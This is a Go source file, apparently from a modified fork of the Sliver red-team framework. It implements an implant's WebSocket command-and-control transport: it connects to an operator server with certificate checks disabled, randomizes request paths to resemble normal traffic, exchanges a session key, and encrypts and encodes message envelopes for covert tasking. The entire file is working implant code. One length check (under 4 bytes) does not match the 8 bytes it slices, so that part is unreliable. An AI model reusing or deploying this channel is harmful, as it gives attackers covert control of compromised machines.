package wsclient

// {{if .Config.IncludeWS}}
import (
	"bytes"
	"crypto/tls"
	"errors"
	"io"
	"strconv"
	"sync"

	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
	insecureRand "math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/gorilla/websocket"
	"google.golang.org/protobuf/proto"
)

var (
	// PingInterval - Amount of time between in-band "pings"
	PingInterval = 90 * time.Second

	cipherCtx *cryptography.CipherContext
	writeMux  = &sync.Mutex{}
	readMux   = &sync.Mutex{}
)

func pathJoinURL(segments []string) string {
	for index, segment := range segments {
		segments[index] = url.PathEscape(segment)
	}
	return strings.Join(segments, "/")
}

// Must return at least a file name, path segments are optional
func randomPath(segments []string, filenames []string, ext string) []string {
	genSegments := []string{}
	if 0 < len(segments) {
		_min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPaths}}")
		_max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPaths}}")
		n := insecureRand.Intn(_max-_min+1) + _min // How many segments?
		for index := 0; index < n; index++ {
			seg := segments[insecureRand.Intn(len(segments))]
			genSegments = append(genSegments, seg)
		}
	}
	filename := filenames[insecureRand.Intn(len(filenames))]

	// {{if .Config.Debug}}
	log.Printf("[ws(s)] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
	// {{end}}
	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
	return genSegments
}

func parseUrl() string {
	var (
		pollFiles    []string
		pollPaths    []string
		sessionFiles []string
		sessionPaths []string
		closePaths   []string
		closeFiles   []string
	)

	// {{range .HTTPC2ImplantConfig.PathSegments}}
	// {{if eq .SegmentType 0 }}
	// {{if .IsFile}}
	pollFiles = append(pollFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	pollPaths = append(pollPaths, "{{.Value}}")
	// {{end}}
	// {{end}}

	// {{if eq .SegmentType 1}}
	// {{if .IsFile}}
	sessionFiles = append(sessionFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	sessionPaths = append(sessionPaths, "{{.Value}}")
	// {{end}}

	// {{end}}
	// {{if eq .SegmentType 2}}
	// {{if .IsFile}}
	closeFiles = append(closeFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	closePaths = append(closePaths, "{{.Value}}")
	// {{end}}
	// {{end}}
	// {{end}}
	return pathJoinURL(randomPath(sessionPaths, sessionFiles, "{{.HTTPC2ImplantConfig.WebSocketFileExtension}}"))
}

// WsConnect - Get a websocket connection or die trying
func WsConnect(uri *url.URL, client *httpclient.SliverHTTPClient) (*websocket.Conn, error) {
	nonce, encoder := encoders.RandomEncoder(0)
	wsclient := &websocket.Dialer{
		Proxy:            http.ProxyFromEnvironment,
		HandshakeTimeout: 45 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		Jar:              client.GetCookieJar(),
	}
	u := &url.URL{Host: uri.Host}
	u.Path = parseUrl()
	u.Scheme = uri.Scheme
	client.NonceQueryArgument(u, nonce)

	if client.Options.ForceHTTP {
		u.Scheme = "ws"
	}
	// {{if .Config.Debug}}
	log.Printf("[ws] will open %s with nonce %d", u.String(), nonce)
	// {{end}}

	req := client.NewHTTPRequest(http.MethodPost, uri, nil)
	headers := req.Header

	connection, _, err := wsclient.Dial(u.String(), headers, client.Options.HostHeader)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	// 初始化加密 Key
	sKey := cryptography.RandomSymmetricKey()
	cipherCtx = cryptography.NewCipherContext(sKey)
	r := insecureRand.New(insecureRand.NewSource(time.Now().UnixNano())).Intn(2000) + 1000
	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:], Buffer: make([]byte, r)}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Nacl encrypt failed %v", err)
		// {{end}}
		return nil, err
	}
	payload, _ := encoder.Encode(encryptedSessionInit)

	encoderFlag := encoders.UintToBytes(nonce)
	payload = append(encoderFlag, payload...)

	err = connection.WriteMessage(websocket.TextMessage, payload)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("WriteMessage failed %v", err)
		// {{end}}
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("encryptedSessionInit is ok")
	// {{end}}

	// 验证密钥交换成功
	_, message, err := connection.ReadMessage()
	if err == io.EOF {
		return nil, err
	}
	if err != io.EOF && err != nil {
		return nil, err
	}
	if !bytes.Equal(message, payload) {
		return nil, errors.New("message error")
	}
	// {{if .Config.Debug}}
	log.Printf("exchange key ok")
	// {{end}}

	return connection, nil
}

// WriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func WriteEnvelope(connection *websocket.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	data, err = cipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope Encrypt error: ", err)
		// {{end}}
		return err
	}

	writeMux.Lock()
	nonce, encoder := encoders.RandomEncoder(0)
	payload, _ := encoder.Encode(data)
	encoderFlag := encoders.UintToBytes(nonce)
	writeMux.Unlock()
	payload = append(encoderFlag, payload...)
	//dataLengthBuf := new(bytes.Buffer)
	//binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))

	//connection.WriteMessage(websocket.TextMessage, append(dataLengthBuf.Bytes(), data...))
	return connection.WriteMessage(websocket.TextMessage, payload)
}

// WritePing - Send a "ping" message to the server
func WritePing(connection *websocket.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
	envelope := pb.Envelope{
		Type: pb.MsgPing,
		Data: pingBuf,
	}
	return WriteEnvelope(connection, &envelope)
}

// ReadEnvelope - Reads a message from the TLS connection using length prefix framing
func ReadEnvelope(connection *websocket.Conn) (*pb.Envelope, error) {
	_, message, err := connection.ReadMessage()
	if err != nil {
		return nil, err
	}
	if len(message) < 4 || connection == nil {
		return nil, errors.New("[[GenerateCanary]]")
	}
	dataLengthBuf := message[:8] //uint32
	nonce := encoders.BytesToUint(dataLengthBuf)
	readMux.Lock()
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		readMux.Unlock()
		return nil, err
	}
	message, err = encoder.Decode(message[8:])
	if err != nil {
		readMux.Unlock()
		return nil, err
	}

	data, err := cipherCtx.Decrypt(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope Decrypt error: ", err)
		// {{end}}
		readMux.Unlock()
		return nil, err
	}
	readMux.Unlock()
	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// {{end}} -IncludeWS
